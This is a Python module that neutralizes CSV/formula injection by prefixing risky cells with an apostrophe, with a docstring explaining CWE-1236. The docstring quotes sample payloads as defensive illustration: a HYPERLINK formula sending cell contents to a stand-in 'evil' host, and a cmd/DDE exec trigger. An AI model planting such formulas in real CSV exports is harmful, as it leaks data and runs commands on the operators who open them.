"""
CSV cell sanitization — prevents CSV/formula injection (CWE-1236).

Spreadsheet applications (Excel, Google Sheets, LibreOffice Calc, ...) treat
a cell whose content begins with certain characters as a *formula* rather
than literal text when a CSV file is opened or imported. If a user- or
tenant-controlled string (a driver's email local-part, a CPO-entered plug
name, a tenant's configured legal name/GSTIN/invoice prefix, ...) is allowed
to begin with one of these trigger characters, an attacker can smuggle a
formula (e.g. ``=HYPERLINK("http://evil/?"&A1)``, a DDE payload, or a
``cmd|'/C calc'!A1``-style exec trigger) into a CSV export. When a
higher-privileged operator (CPO/admin) later opens that export in a
spreadsheet program, the formula executes in their spreadsheet session —
a stored-injection attack that crosses a privilege boundary even though the
CSV file itself contains only text.

See:
  - CWE-1236: Improper Neutralization of Formula Elements in a CSV File
  - OWASP: CSV Injection
    https://owasp.org/www-community/attacks/CSV_Injection

Mitigation: prefix any cell value whose text begins with ``=``, ``+``,
``-``, ``@``, or a tab/CR/LF with a single leading apostrophe (``'``).
Every major spreadsheet application renders a leading apostrophe as a
"force text" marker — it is not itself displayed, and the remainder of the
string is preserved verbatim as literal text instead of being parsed as a
formula.

This module intentionally exposes a single small, pure function so it can
be applied selectively: callers should wrap only genuinely free-text /
user-controlled string cells (e.g. names, emails, free-text identifiers).
Numeric, decimal, and date/timestamp cells that an endpoint formats itself
(``f"{x:.2f}"``, ISO timestamps, etc.) should NOT be routed through this
function, since a leading ``-`` on a legitimate negative number would
otherwise be needlessly apostrophe-prefixed.
"""
from typing import Any

# Leading characters that spreadsheet applications interpret as a formula /
# special-cell trigger when a CSV is opened or imported.
_FORMULA_TRIGGER_CHARS = ("=", "+", "-", "@", "\t", "\r", "\n")


def sanitize_csv_cell(value: Any) -> str:
    """Return `value` rendered as a string safe to write into a CSV cell.

    Behavior:
      - ``None`` becomes ``""``.
      - Any other value is stringified with ``str(value)``.
      - If the resulting string — after stripping leading whitespace —
        starts with one of ``=``, ``+``, ``-``, ``@``, or a tab/CR/LF, a
        single leading apostrophe (``'``) is prepended to the (original,
        non-stripped) string so spreadsheet applications treat the cell as
        literal text instead of a formula.
      - Every other value is returned unchanged (as a string).

    Idempotent-safe: re-running this on an already-neutralized string is a
    no-op, because a leading ``'`` is not itself one of the trigger
    characters, so a second pass never double-prefixes it.

    This is a presentation-layer neutralization for spreadsheet consumers;
    it is not a substitute for normal input validation and does not change
    the underlying stored value, only what is written into the CSV cell.
    """
    if value is None:
        return ""

    text = str(value)
    # Only strip plain leading spaces (0x20) here, not `str.lstrip()`'s full
    # whitespace set — tab/CR/LF are themselves trigger characters (per
    # CWE-1236) and must still be detected when they're the very first
    # character, rather than being stripped away before the check runs.
    if text.lstrip(" ").startswith(_FORMULA_TRIGGER_CHARS):
        return "'" + text
    return text
